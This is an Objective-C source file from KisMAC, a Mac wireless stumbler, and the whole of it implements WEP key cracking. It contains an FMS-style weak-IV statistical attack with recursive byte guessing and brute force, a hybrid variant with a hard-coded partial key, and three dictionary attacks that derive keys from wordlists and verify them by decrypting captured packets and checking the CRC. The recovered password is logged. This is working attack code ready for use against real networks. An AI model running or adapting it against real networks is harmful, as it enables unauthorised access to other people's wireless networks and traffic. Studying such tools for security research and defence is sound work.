/*
        
        File:			WaveCracker.mm
        Program:		KisMAC
	Author:			Dylan Neild, Michael Ro§berg
				mick@binaervarianz.de
	Description:		KisMAC is a wireless stumbler for MacOS X.
                
        This file is part of KisMAC.
        
    KisMAC is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    KisMAC is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with KisMAC; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

#import "WaveCracker.h"
#import "WaveHelper.h"
#import "ScanController.h"
#import "../3rd Party/FCS.h"

@implementation WaveCracker

-(id) init {
    unsigned int i;
    self=[super init];
    
    setupIdentity();		//initialized the RC4 sboxes
    
    for (i = 0; i < 256; i++) {	    //precache crack data
        aMaster[i].score=0;
        aMaster[i].index=i;
    }
    aIsInit=NO;
    return self;
}

//check whether a certain key is right, by deciphering examples
- (int) checkKey:(NSArray*)packets key:(unsigned char*)k {
    int w;
    unsigned int i, h;
    unsigned char key[16];
    unsigned long crc;
    RC4 rc;
    
    //copy the guess without the iv
    memcpy(key+3, k, _keywidth);

    //go thought all examples
    for(i=0;i<[packets count];i++) {
        if (!aIsInit) {
            [(NSString*)[packets objectAtIndex:i] getCString:(char*)aData];
            aLength=[(NSString*)[packets objectAtIndex:i] length];
            memcpy(key, aData, 3);
            if (i==0) aIsInit=YES;
        }
        //decipher the packet
        RC4InitWithKey(&rc, key, _keywidth+3); 
        crc=0xffffffff;
        for(h = 4; h < aLength; h++) crc=UPDC32(aData[h]^step(&rc),crc);
        //check whether checksum is correct
        if (crc != 0xdebb20e3) return 0;
        aIsInit=NO;
    }

    //return key in hexadecimal
    aKey=[[NSMutableString stringWithFormat:@"%.2X", aCurGuess[3]] retain];
    for (w=4;w<(_keywidth+3);w++)
        [aKey appendString:[NSString stringWithFormat:@":%.2X", aCurGuess[w]]];
    return 1;
}

//sots all guesses based on their score
int score_compare(const void *a,const void *b) {
  return ((struct sScore*) b)->score-((struct sScore*) a)->score;
}

//does the actual cracking for byte "level"
-(int) performCrackWithDepth:(int)level brute:(bool)doBrute {
    struct sScore aScore[256];
    NSEnumerator* e;
    NSNumber* key;
    unsigned int iv,i;
    int h, j=0;
    NSDictionary *d;
    
    //if we hav the maximum size of the key check its correctness
    if (level == _keywidth) return [self checkKey:[_net weakPacketsLog] key:aCurGuess+3];
    
    //init
    memcpy(aScore,aMaster,sizeof(struct sScore)*256);
    
    d = [_net weakPacketsDict];
    //cycle through all weak packets, and give them a rating
    e=[[d objectForKey:[NSNumber numberWithInt:level]] keyEnumerator];
    while (key = [e nextObject]) {
        iv=[key unsignedIntValue];
        memcpy(aCurGuess,((char*)&iv)+1,3);
        //make a guess
        h = tryIVx(aCurGuess, level, [[[d objectForKey:[NSNumber numberWithInt:level]] objectForKey:key] unsignedCharValue],&j);
        aScore[j].score+=h;
    }

    //sort all possiblities based on their rating
    qsort(aScore, 256, sizeof(struct sScore), score_compare);
    for(i = 0; i < _breath; i++) {
        if (((level==1)&&(_keywidth==5))||((level==3)&&(_keywidth==13))) {
            [_im increment];
            if ([_im canceled]) return 1;
        }
        
        if (aScore[i].score == 0) return 0;	//dont have any more weak packets for this byte
        aCurGuess[3+level] = aScore[i].index;	//set the current guess
        if ([self performCrackWithDepth:level + 1 brute:doBrute] == 1) return 1;
    }

    if (doBrute&&([[d objectForKey:[NSNumber numberWithInt:level]] count]<60)) for(i = 0; i < 256; i++) {
        aCurGuess[3+level] = aScore[i].index;	//set the current guess
        if ([self performCrackWithDepth:level + 1 brute:false] == 1) return 1;
    }
    
    return 0;
}

#define N 256
#define SWAP(x, y) { if(x != y) x ^= y ^= x ^= y; }

u_char
reversekey(u_char output, int B, int j, u_char *S)
{
  register int i;

  /*
   * S{-1 t}[X] denotes the location within the permutation S{t} where
   * the value X appears
   */
  for(i = 0; i < N; i++)
    if(S[i] == output)
    {
      output = i;
      break;
    } 

  return((output - j - S[B + 3]) % N);
}

//does the actual cracking for byte "level"
-(int) performHybridCrackWithDepth:(int)level {
    struct sScore aScore[256];
    NSEnumerator* e;
    NSNumber* key;
    unsigned int iv;
    int i;
    int B;
    int j=0;
    NSDictionary *d;
    u_char E, S[N];
    
    //if we hav the maximum size of the key check its correctness
    if (level == _keywidth) return [self checkKey:[_net weakPacketsLog] key:aCurGuess+3];
    
    B = level;
    
    //init
    memcpy(aScore,aMaster,sizeof(struct sScore)*256);
    
    d = [_net weakPacketsDict];
    //cycle through all weak packets, and give them a rating
    e=[[d objectForKey:[NSNumber numberWithInt:level]] keyEnumerator];
    while (key = [e nextObject]) {
        iv=[key unsignedIntValue];
        memcpy(aCurGuess, ((char*)&iv)+1, 3);
        //make a guess
        //h = tryIVx(aCurGuess, level, [[[d objectForKey:[NSNumber numberWithInt:level]] objectForKey:key] unsignedCharValue], &j);

        /* Setup the S set for {0,....,N - 1} */
        for(i = 0; i < N; i++)
          S[i] = i;

        /* Permutate ;-Q~ */
        for(i = 0, j = 0; i < B + 3; i++) {
          j = (j + S[i] + aCurGuess[i % (B + 3)]) % N;
          SWAP(S[i], S[j]);
        }

        if(!(S[1] < B + 3 && (S[1] + S[S[1]]) % N == B + 3))
          continue;

        E = reversekey([[[d objectForKey:[NSNumber numberWithInt:level]] objectForKey:key] unsignedCharValue], B, j, S);

        /* if there's duplicates of X, Y, or Z, we've got e^-2 instead of e^-3 */
        if(S[1] == S[S[1]] || S[1] == S[(S[1] + S[S[1]]) % N] ||
         S[S[1]] == S[(S[1] + S[S[1]]) % N])
          aScore[E].score += 13;
        else
          aScore[E].score += 5;
    }

    //sort all possiblities based on their rating
    qsort(aScore, 256, sizeof(struct sScore), score_compare);
    for(i = 0; i < (int)_breath; i++) {        
        if (aScore[i].score == 0) return 0;	//dont have any more weak packets for this byte
        aCurGuess[3+level] = aScore[i].index;	//set the current guess
        if ([self performHybridCrackWithDepth:level + 1] == 1) return 1;
    }
    
    return 0;
}

- (int)hybridAttack {
    int i;
    
    aCurGuess[3] = 0x37;
    aCurGuess[4] = 0x7D;
    aCurGuess[5] = 0xEA;
    aCurGuess[6] = 0x12;
    aCurGuess[7] = 0xEC;
    aCurGuess[8] = 0xF5;
    aCurGuess[9] = 0xC4;
    aCurGuess[10] = 0x4E;
    aCurGuess[11] = 0x04;
    aCurGuess[12] = 0x78;
    aCurGuess[13] = 0x00;
    aCurGuess[14] = 0x03;
    aCurGuess[15] = 0x91;
    
    if ([self performHybridCrackWithDepth: 12]) return 1;
    
    [_im setMax:256];
    
    for (i = 0; i<=0xFFFFFF; i++) {
        if ((i % 0x10000) == 0) {
            [_im increment];
            if ([_im canceled]) return 0;
        }
        memcpy(&aCurGuess[3], ((char*)&i) + 1, 3);
        if ([self performHybridCrackWithDepth: 3]) return 1;
    }

    return 0;
}

- (void)weakThread:(id)object {
    int res;
    NSAutoreleasePool* subpool = [[NSAutoreleasePool alloc] init];
    
    //res = [self hybridAttack];
    res = [self performCrackWithDepth:0 brute:false];
    
    [_im terminateWithCode: res - 1];

    [subpool release];
}

//public function to crack based on weak packets
-(void) crackWithKeyByteLength:(unsigned int)a net:(WaveNet*)aNet breath:(unsigned int)b import:(ImportController*)i {
    for (int p=0;p<13;p++)
        NSLog(@"WeakPackets for %u. KeyByte: %u.\n",p+1,[[[aNet weakPacketsDict] objectForKey:[NSNumber numberWithInt:p]] count]);
    
    if (aKey==Nil) {
        _im = i;
        _net = aNet;
        _keywidth = a;
        _breath = b;
        
        [NSThread detachNewThreadSelector:@selector(weakThread:) toTarget:self withObject:nil];
    }
}

//public function - returns a cracked key, nil otherwise
-(NSString*) key {
    return aKey;
}

-(void) dealloc {
    [aKey release];
    [super dealloc];
}

// BRUTE FORCE FUNCTIONS
// EVERYTHING BELOW THIS LINE REPRESENTS AN ADAPTATION/PATCH BY DYLAN NEILD (dylann@mac.com)
// 
// 1. Floating point function is now VERY fast (almost 4x faster). There is no function calling (except to grab the packet). 
//    The key increment system is completely inlined and uses -no- recursion, so in -O3 mode, it's -very- fast. 
// 
// 2. CRC is calculated on the fly, per byte. We don't need to actually store the decrypted data when we're finished with it,
//    so rather then using lData[] to store data, we simply decrypt and CRC it as we go.  
// 
// 3. 3 seperate function are now included, for "All Characters", "Alpha Numeric Characters" and "Lower Case" characters.
//    This is so we don't need to use a function pointer for keyincrement (and the key increment itself is now inlined). 
//    This is a trivial performance boost, but a boost none the less.
//
// 4. The RC4 setup sequence (setting up the initial 0-256 array of unsigned chars) is no longer duplicate per key, as it's
//    a waste of 256+ cpu cycles. We build it once, then assign it in place per key. 

- (void)crackThread:(id)object {
    NSAutoreleasePool* subpool = [[NSAutoreleasePool alloc] init];
    unsigned int x, res = 0;
    
    for (x=0; x<[_filenames count]; x++) {
        switch (_chars) {
            case 1:
                res = [self doWordlistAttack40Apple:_net withWordlist:[_filenames objectAtIndex:x]];
                break;
            case 2:
                res = [self doWordlistAttack104Apple:_net withWordlist:[_filenames objectAtIndex:x]];
                break;
            case 3:
                res = [self doWordlistAttack104MD5:_net withWordlist:[_filenames objectAtIndex:x]];
                break;
        }
    }

    [_im terminateWithCode: res - 1];

    [subpool release];
}

-(void) crackWithWordlist:(NSArray*) filenames useCipher:(unsigned int)a net:(WaveNet*)aNet import:(ImportController*)i {
    _im = i;
    _chars = a;
    _net = aNet;
    
    [_filenames release];
    _filenames = [filenames retain];
    
    [NSThread detachNewThreadSelector:@selector(crackThread:) toTarget:self withObject:nil];
}

-(int)doWordlistAttack40Apple:(WaveNet *)aNet withWordlist:(NSString*)filename {
    FILE* fptr;
    char wrd[1000];
    unsigned int i, words, foundCRC, counter;
    unsigned char key[16], skeletonStateArray[256], currentStateArray[256];
    unsigned char y, z, tmp, xov;
    
    if (aKey!=Nil) return 1;
    aIsInit = false;
    
    fptr = fopen([filename cString], "r");
    if (!fptr) return 0;    
    
    //select the right increment function for each character set
    
    for (counter = 0; counter < 256; counter++) 
        skeletonStateArray[counter] = counter;
    
    words = 0;
    wrd[990]=0;

    while(![_im canceled] && !feof(fptr)) {
        fgets(wrd, 990, fptr);
        i = strlen(wrd) - 1;
        wrd[i] = 0;
        if (wrd[i - 1]=='\r') wrd[--i] = 0;
        
        words++;
        
        WirelessEncrypt((CFStringRef)[NSString stringWithCString:wrd length:i],(WirelessKey*)(key+3),0);

        for(i=0;i<[[aNet weakPacketsLog] count];i++) {

            if (!aIsInit) {	
                
                [(NSString*)[[aNet weakPacketsLog] objectAtIndex:i] getCString:(char*)aData];
                aLength=[(NSString*)[[aNet weakPacketsLog] objectAtIndex:i] length];
                
                memcpy(key, aData, 3);
                
                if (i==0) aIsInit=YES;
            }
            
            memcpy(currentStateArray, skeletonStateArray, 256);
            y = z = 0;
            
            for (counter = 0; counter < 256; counter++) {
                z = (key[y] + currentStateArray[counter] + z);
            
                tmp = currentStateArray[counter];
                currentStateArray[counter] = currentStateArray[z];
                currentStateArray[z] = tmp;
                
                y = (y + 1) % 8;
            }
            
            foundCRC = 0xFFFFFFFF;
            y = z = 0;
                        
            for (counter = 4; counter < aLength; counter++) {
                y++;
                z = currentStateArray[y] + z;
                
                tmp = currentStateArray[y];
                currentStateArray[y] = currentStateArray[z];
                currentStateArray[z] = tmp;
                
                xov = currentStateArray[y] + currentStateArray[z];

                foundCRC = UPDC32((aData[counter] ^ currentStateArray[xov]), foundCRC);
            }

            if (foundCRC == 0xdebb20e3) {
                memcpy(&aCurGuess, &key, 16);
                aIsInit=NO;
            }
            else 
                break;
        }

        if (i >= 10) {
            aKey=[[NSMutableString stringWithFormat:@"%.2X", aCurGuess[3]] retain];
            for (i=4;i<(8);i++)
                [aKey appendString:[NSString stringWithFormat:@":%.2X", aCurGuess[i]]];
            fclose(fptr);
            NSLog(@"Cracking was successful. Password is <%s>", wrd);
            return 1;
        }
        if (words % 10000 == 0) {
            [_im setStatusField:[NSString stringWithFormat:@"%d words tested", words]];
        }
    }
    
    fclose(fptr);
    return 0;
}

-(int)doWordlistAttack104Apple:(WaveNet *)aNet withWordlist:(NSString*)filename {
    FILE* fptr;
    char wrd[1000];
    unsigned int i, words, foundCRC, counter;
    unsigned char key[16], skeletonStateArray[256], currentStateArray[256];
    unsigned char y, z, tmp, xov;
    
    if (aKey!=Nil) return 1;
    aIsInit = false;
    
    fptr = fopen([filename cString], "r");
    if (!fptr) return 0;    
    
    //select the right increment function for each character set
    
    for (counter = 0; counter < 256; counter++) 
        skeletonStateArray[counter] = counter;
    
    words = 0;
    wrd[990]=0;

    while(![_im canceled] && !feof(fptr)) {
        fgets(wrd, 990, fptr);
        i = strlen(wrd) - 1;
        wrd[i] = 0;
        if (wrd[i - 1]=='\r') wrd[--i] = 0;
        
        words++;
        
        WirelessEncrypt((CFStringRef)[NSString stringWithCString:wrd length:i],(WirelessKey*)(key+3),1);

        for(i=0;i<[[aNet weakPacketsLog] count];i++) {

            if (!aIsInit) {	
                
                [(NSString*)[[aNet weakPacketsLog] objectAtIndex:i] getCString:(char*)aData];
                aLength=[(NSString*)[[aNet weakPacketsLog] objectAtIndex:i] length];
                
                memcpy(key, aData, 3);
                
                if (i==0) aIsInit=YES;
            }
            
            memcpy(currentStateArray, skeletonStateArray, 256);
            y = z = 0;
            
            for (counter = 0; counter < 256; counter++) {
                z = (key[y] + currentStateArray[counter] + z);
            
                tmp = currentStateArray[counter];
                currentStateArray[counter] = currentStateArray[z];
                currentStateArray[z] = tmp;
                
                y = (y + 1) % 16;
            }
            
            foundCRC = 0xFFFFFFFF;
            y = z = 0;
                        
            for (counter = 4; counter < aLength; counter++) {
                y++;
                z = currentStateArray[y] + z;
                
                tmp = currentStateArray[y];
                currentStateArray[y] = currentStateArray[z];
                currentStateArray[z] = tmp;
                
                xov = currentStateArray[y] + currentStateArray[z];

                foundCRC = UPDC32((aData[counter] ^ currentStateArray[xov]), foundCRC);
            }

            if (foundCRC == 0xdebb20e3) {
                memcpy(&aCurGuess, &key, 16);
                aIsInit=NO;
            }
            else 
                break;
        }

        if (i >= 10) {
            aKey=[[NSMutableString stringWithFormat:@"%.2X", aCurGuess[3]] retain];
            for (i=4;i<(16);i++)
                [aKey appendString:[NSString stringWithFormat:@":%.2X", aCurGuess[i]]];
            fclose(fptr);
            NSLog(@"Cracking was successful. Password is <%s>", wrd);
            return 1;
        }
        if (words % 10000 == 0) {
            [_im setStatusField:[NSString stringWithFormat:@"%d words tested", words]];
        }
    }
    
    fclose(fptr);
    return 0;
}

-(int)doWordlistAttack104MD5:(WaveNet *)aNet withWordlist:(NSString*)filename {
    FILE* fptr;
    char wrd[1000];
    unsigned int i, words, foundCRC, counter;
    unsigned char key[16], skeletonStateArray[256], currentStateArray[256];
    unsigned char y, z, tmp, xov;
    
    if (aKey!=Nil) return 1;
    aIsInit = false;
    
    fptr = fopen([filename cString], "r");
    if (!fptr) return 0;
    
    //select the right increment function for each character set
    
    for (counter = 0; counter < 256; counter++) 
        skeletonStateArray[counter] = counter;
    
    words = 0;
    wrd[990]=0;

    while(![_im canceled] && !feof(fptr)) {
        fgets(wrd, 990, fptr);
        i = strlen(wrd) - 1;
        wrd[i--] = 0;
        if (wrd[i]=='\r') wrd[i] = 0;
        
        words++;
        
        WirelessCryptMD5(wrd, key+3);

        for(i=0;i<[[aNet weakPacketsLog] count];i++) {

            if (!aIsInit) {	
                
                [(NSString*)[[aNet weakPacketsLog] objectAtIndex:i] getCString:(char*)aData];
                aLength=[(NSString*)[[aNet weakPacketsLog] objectAtIndex:i] length];
                
                memcpy(key, aData, 3);
                
                if (i==0) aIsInit=YES;
            }
            
            memcpy(currentStateArray, skeletonStateArray, 256);
            y = z = 0;
            
            for (counter = 0; counter < 256; counter++) {
                z = (key[y] + currentStateArray[counter] + z);
            
                tmp = currentStateArray[counter];
                currentStateArray[counter] = currentStateArray[z];
                currentStateArray[z] = tmp;
                
                y = (y + 1) % 16;
            }
            
            foundCRC = 0xFFFFFFFF;
            y = z = 0;
                        
            for (counter = 4; counter < aLength; counter++) {
                y++;
                z = currentStateArray[y] + z;
                
                tmp = currentStateArray[y];
                currentStateArray[y] = currentStateArray[z];
                currentStateArray[z] = tmp;
                
                xov = currentStateArray[y] + currentStateArray[z];

                foundCRC = UPDC32((aData[counter] ^ currentStateArray[xov]), foundCRC);
            }

            if (foundCRC == 0xdebb20e3) {
                memcpy(&aCurGuess, &key, 16);
                aIsInit=NO;
            }
            else 
                break;
        }

        if (i >= 10) {
            aKey=[[NSMutableString stringWithFormat:@"%.2X", aCurGuess[3]] retain];
            for (i=4;i<(16);i++)
                [aKey appendString:[NSString stringWithFormat:@":%.2X", aCurGuess[i]]];
            fclose(fptr);
            NSLog(@"Cracking was successful. Password is <%s>", wrd);
            return 1;
        }
        
        if (words % 10000 == 0) {
            [_im setStatusField:[NSString stringWithFormat:@"%d words tested", words]];
        }
    }
    
    fclose(fptr);
    return 0;
}

@end
